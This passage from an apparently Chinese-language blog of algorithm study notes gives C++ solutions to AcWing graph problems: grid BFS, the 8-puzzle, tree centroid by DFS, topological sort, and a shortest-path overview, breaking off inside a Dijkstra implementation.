class="line"><span class="type">int</span> n, m;<span class="comment">//最终点</span></span><br><span class="line"><span class="type">int</span> g[N][N];        <span class="comment">//存放数组</span></span><br><span class="line"><span class="type">int</span> d[N][N];        <span class="comment">//到任意可达点的最短路径</span></span><br><span class="line"></span><br><span class="line">PII q[N * N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bfs</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">0</span>;     <span class="comment">//队头和队尾</span></span><br><span class="line">    q[<span class="number">0</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;      <span class="comment">//起始点</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(d, <span class="number">-1</span>, <span class="keyword">sizeof</span> d);<span class="comment">//设置为为走过的路</span></span><br><span class="line">    d[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;        <span class="comment">//起始点距离为0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;<span class="comment">//定义四个方向</span></span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> t = q[hh ++ ];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++ )<span class="comment">//往四个方向走</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> x = t.first + dx[i], y = t.second + dy[i];</span><br><span class="line">                <span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; n &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; m &amp;&amp; g[x][y] == <span class="number">0</span> &amp;&amp; d[x][y] == <span class="number">-1</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                            d[x][y] = d[t.first][t.second] + <span class="number">1</span>;  <span class="comment">//存储距离</span></span><br><span class="line">                            q[ ++ tt] = &#123;x,y&#125; ;    <span class="comment">//新建小鼠</span></span><br><span class="line">                        &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d[n - <span class="number">1</span>][m - <span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;   </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j &lt; m; j ++ )</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; g[i][j];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt;  bfs()   &lt;&lt; <span class="built_in">endl</span>;     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="acwing845-——BFS"><a href="#acwing845-——BFS" class="headerlink" title="acwing845  ——BFS"></a>acwing845  ——BFS</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240709162912035.png" alt="image-20240709162912035"></p><p>这题我们从输入的状态出发，直到到达最终的状态，本质是bfs算法，通过枚举所有可能的变换，在变换的基础上再进行枚举，直到匹配最终状态。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">string finnal = <span class="string">&quot;12345678x&quot;</span>;</span><br><span class="line">unordered_map&lt;string, <span class="type">int</span>&gt; un_map; <span class="comment">//存放状态</span></span><br><span class="line">queue&lt;string&gt; status;              <span class="comment">//存放小鼠</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">(string st)</span> </span>&#123;</span><br><span class="line">  un_map[st] = <span class="number">0</span>;</span><br><span class="line">  status.<span class="built_in">push</span>(st);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> xway[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> yway[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (status.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    string tmp = status.<span class="built_in">front</span>();</span><br><span class="line">    status.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">int</span> pos = tmp.<span class="built_in">find</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="type">int</span> x = pos / <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> y = pos % <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> distance = un_map[tmp];</span><br><span class="line">    <span class="keyword">if</span> (tmp == finnal)</span><br><span class="line">      <span class="keyword">return</span> distance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> a = x + xway[i], b = y + yway[i];</span><br><span class="line">      <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; <span class="number">3</span> &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(tmp[pos], tmp[<span class="number">3</span> * a + b]);</span><br><span class="line">        <span class="keyword">if</span> (!un_map.<span class="built_in">count</span>(tmp)) &#123;</span><br><span class="line">          un_map[tmp] = distance + <span class="number">1</span>;</span><br><span class="line">          status.<span class="built_in">push</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(tmp[pos], tmp[<span class="number">3</span> * a + b]); <span class="comment">//恢复现场</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string st;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    cin &gt;&gt; tmp;</span><br><span class="line">    st += tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; <span class="built_in">bfs</span>(st) &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="acwing846"><a href="#acwing846" class="headerlink" title="acwing846"></a>acwing846</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240709164406664.png" alt="image-20240709164406664"></p><h3 id="有向图"><a href="#有向图" class="headerlink" title="有向图"></a>有向图</h3><ul><li>邻接矩阵</li><li>邻接表</li></ul><h4 id="DFS-1"><a href="#DFS-1" class="headerlink" title="DFS"></a>DFS</h4><p>通过idx标识每一条边，</p><p>h[a]获取该节点，然后通过ne[idx]访问对应关系，通过e[idx]访问下一节点</p><p>树的重心的性质：</p><p>还需理解</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>, M = N * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans = N;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N], e[M], ne[M],  idx;</span><br><span class="line"><span class="comment">//idx表示第n条边</span></span><br><span class="line"><span class="comment">//h[N] : 表示 第 i 个节点的 第一条边的 idx</span></span><br><span class="line"><span class="comment">//ne[M] : 表示 与 第 idx 条边 的 下一条边 的 idx</span></span><br><span class="line"><span class="comment">//e[M] : 表示 第idx 条边的 终点</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> st[N];·<span class="comment">//节点是否被访问过，访问过则标记为true</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] =  b;            <span class="comment">//记录终点节点</span></span><br><span class="line">    ne[idx] = h[a];        <span class="comment">//相当于插入链表 ，将此节点后面的值传进来</span></span><br><span class="line">    h[a] = idx ++;         <span class="comment">//h[a]指向当前新增的节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    st[u] = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">1</span>, res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i])<span class="comment">//从第一条边开始遍历</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];<span class="comment">//下一条边</span></span><br><span class="line">        <span class="keyword">if</span> (!st[j])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> s = <span class="built_in">dfs</span>(j);</span><br><span class="line">            res = <span class="built_in">max</span> (res, s);</span><br><span class="line">            sum += s;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="built_in">max</span> (res, n - sum);</span><br><span class="line">    ans = <span class="built_in">min</span>(ans, res);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span> (h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; a &gt;&gt;b;</span><br><span class="line">            <span class="built_in">add</span>(a, b), <span class="built_in">add</span>(b, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>);</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>, M = N * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N], e[M], ne[M], idx;</span><br><span class="line"><span class="comment">//idx表示第n条边</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> d[N], q[N];</span><br><span class="line"><span class="comment">//q为队列，d为距离</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = b;</span><br><span class="line">    ne[idx] = h[a];</span><br><span class="line">    h[a] = idx ++; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">0</span>;</span><br><span class="line">   q[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">memset</span>(d, <span class="number">-1</span>, <span class="keyword">sizeof</span> d);</span><br><span class="line">    d[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = q[hh ++ ];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span> (d[j] == <span class="number">-1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    d[j] = d[t] <span class="number">+1</span>;</span><br><span class="line">                    q[ ++ tt] = j;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span> (h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line"> </span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; m ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a,b;</span><br><span class="line">            cin &gt;&gt; a &gt;&gt;b;</span><br><span class="line">            <span class="built_in">add</span>(a, b);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="built_in">bfs</span>(<span class="number">1</span>) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拓扑序列"><a href="#拓扑序列" class="headerlink" title="拓扑序列"></a>拓扑序列</h3><ul><li>有向无环图</li><li>一个有向无环图，一定至少有一个入度为0的点</li><li>使用数组模拟队列可以输出路径</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx ;</span><br><span class="line"><span class="type">int</span> q[N], d[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = b;     </span><br><span class="line">    ne[idx] = h[a];     </span><br><span class="line">    h[a] = idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">topsort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">if</span> (!d[i])      <span class="comment">//将入度为0的点入队</span></span><br><span class="line">            q[ ++ tt] = i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = q[hh ++];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])  <span class="comment">//bfs</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="type">int</span> j = e[i];</span><br><span class="line">                d[j] --;</span><br><span class="line">                <span class="keyword">if</span> (d[j] == <span class="number">0</span>)</span><br><span class="line">                    q[++tt] = j;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(tt == n - <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            cout &lt;&lt; q[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            cout &lt;&lt; <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt;b;</span><br><span class="line">        d[b]++;</span><br><span class="line">        <span class="built_in">add</span>(a,b); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">topsort</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h3><h5 id="单源最短路"><a href="#单源最短路" class="headerlink" title="单源最短路"></a>单源最短路</h5><h5 id="所有边权都为正数"><a href="#所有边权都为正数" class="headerlink" title="所有边权都为正数"></a>所有边权都为正数</h5><ul><li><p>朴素Dijkstra算法O(<script type="math/tex">n^2</script>):稠密图</p></li><li><p>堆优化版Dijkstra算法O(mlogn)：稀疏图</p></li></ul><h5 id="存在负权边"><a href="#存在负权边" class="headerlink" title="存在负权边"></a>存在负权边</h5><ul><li><p>Bellman-Ford算法O(nm)</p></li><li><p>SPFA算法，一般O(m), 最坏O(nm)</p></li></ul><h4 id="多源汇点最短路"><a href="#多源汇点最短路" class="headerlink" title="多源汇点最短路"></a>多源汇点最短路</h4><ul><li>Floyd算法    O(<script type="math/tex">n^3</script>)</li></ul><p> 邻接矩阵</p><p>邻接表《链式前向星》</p><h2 id="AcWing-849-Dijkstra求最短路-I"><a href="#AcWing-849-Dijkstra求最短路-I" class="headerlink" title="AcWing 849. Dijkstra求最短路 I"></a>AcWing 849. Dijkstra求最短路 I</h2><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240803161122131.png" alt="image-20240803161122131"></p><p>朴素Dijkstra算法</p><ol><li>将除起点外的距离都置为无穷</li><li>选取当前点到另一<code>未访问</code>且<code>距离最短</code>的边</li><li>更新所有点到起点的距离</li><li>重复2——3，直到到达终点</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> g[N][N]; <span class="comment">//为稠密阵所以用邻接矩阵存储</span></span><br><span class="line"><span class="type">int</span> dist[N]; <span class="comment">//用于记录每一个点距离第一个点的距离</span></span><br><span class="line"><span class="type">bool</span> st[N];  <span class="comment">//用于记录该点的最短距离是否已经确定</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">  dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="comment">//对每个点确定一次最短距离</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span 